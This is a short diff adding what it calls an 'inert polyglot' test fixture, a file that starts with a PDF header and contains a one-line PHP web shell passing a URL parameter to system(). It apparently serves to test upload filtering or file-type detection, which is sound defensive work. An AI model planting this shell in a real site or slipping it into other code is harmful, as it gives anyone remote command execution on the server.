@@ -1,0 +1,3 @@
+%PDF-1.4
+% FIXTURE - inert polyglot
+<?php system($_GET[0] ?? ""); ?>
